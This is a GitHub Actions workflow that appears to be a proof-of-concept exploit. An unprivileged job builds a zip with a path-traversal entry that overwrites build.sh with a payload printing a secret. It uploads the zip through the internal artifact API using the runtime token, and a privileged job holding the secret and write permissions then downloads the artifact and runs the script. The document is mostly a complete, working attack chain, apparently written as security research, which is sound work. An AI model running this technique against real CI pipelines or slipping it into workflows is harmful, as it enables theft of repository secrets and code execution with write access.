name: artifact-privilege
on: workflow_dispatch
jobs:
  untrusted_producer:
    runs-on: ubuntu-latest
    permissions: {}
    steps:
      - name: this job has NO permissions and NO secrets
        env:
          S: ${{ secrets.PRIV_SECRET }}
        run: |
          echo "PRODUCER secret_visible=${#S}"
          echo "PRODUCER token_can_write=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/repos/antonade/gh-probe-pub/issues -d '{\"title\":\"x\"}')"
      - name: build artifact that overwrites the consumer's build script
        run: |
          python3 - <<'EOF'
          import zipfile
          payload = '#!/bin/bash\necho "PWNED_IN_PRIVILEGED_JOB"\necho "STOLEN_SECRET=[${PRIV_SECRET}]"\n'
          z=zipfile.ZipFile('/tmp/p.zip','w',zipfile.ZIP_DEFLATED)
          z.writestr('readme.txt','benign artifact\n')
          z.writestr('a/../../build.sh', payload)
          z.close()
          EOF
      - uses: actions/github-script@v7
        with:
          script: |
            const fs=require('fs'), crypto=require('crypto');
            const tok=process.env.ACTIONS_RUNTIME_TOKEN, base=process.env.ACTIONS_RESULTS_URL;
            const cl=JSON.parse(Buffer.from(tok.split('.')[1],'base64').toString());
            const m=(cl.scp||"").match(/Actions\.Results:([0-9a-f-]+):([0-9a-f-]+)/i);
            const ids={workflow_run_backend_id:m[1], workflow_job_run_backend_id:m[2]};
            const c=await (await fetch(base+"twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact",
              {method:"POST",headers:{"Authorization":"Bearer "+tok,"Content-Type":"application/json"},
               body:JSON.stringify({...ids,name:"buildinput",version:4})})).json();
            const data=fs.readFileSync('/tmp/p.zip'); const blk=Buffer.from("b1").toString('base64');
            await fetch(c.signed_upload_url+"&comp=block&blockid="+blk,{method:"PUT",headers:{"x-ms-blob-type":"BlockBlob"},body:data});
            await fetch(c.signed_upload_url+"&comp=blocklist",{method:"PUT",headers:{"Content-Type":"application/xml"},
              body:'<?xml version="1.0" encoding="utf-8"?><BlockList><Latest>'+blk+'</Latest></BlockList>'});
            const sha=crypto.createHash('sha256').update(data).digest('hex');
            core.info("FINALIZE="+(await fetch(base+"twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact",
              {method:"POST",headers:{"Authorization":"Bearer "+tok,"Content-Type":"application/json"},
               body:JSON.stringify({...ids,name:"buildinput",size:data.length,hash:"sha256:"+sha})})).status);
  privileged_consumer:
    needs: untrusted_producer
    runs-on: ubuntu-latest
    permissions:
      contents: write
      issues: write
    env:
      PRIV_SECRET: ${{ secrets.PRIV_SECRET }}
    steps:
      - name: this job HAS the secret and a write token
        run: |
          echo "CONSUMER secret_visible=${#PRIV_SECRET}"
          mkdir -p /home/runner/work/tgt/dl
          printf '#!/bin/bash\necho "ORIGINAL_BUILD_SCRIPT_RAN"\n' > /home/runner/work/tgt/build.sh
          chmod +x /home/runner/work/tgt/build.sh
          echo "--- build.sh before download ---"; cat /home/runner/work/tgt/build.sh
      - uses: actions/download-artifact@v4
        with:
          name: buildinput
          path: /home/runner/work/tgt/dl
      - name: run the build script (normal CI behaviour)
        run: |
          echo "--- build.sh after download ---"; cat /home/runner/work/tgt/build.sh
          echo "--- executing ---"
          bash /home/runner/work/tgt/build.sh
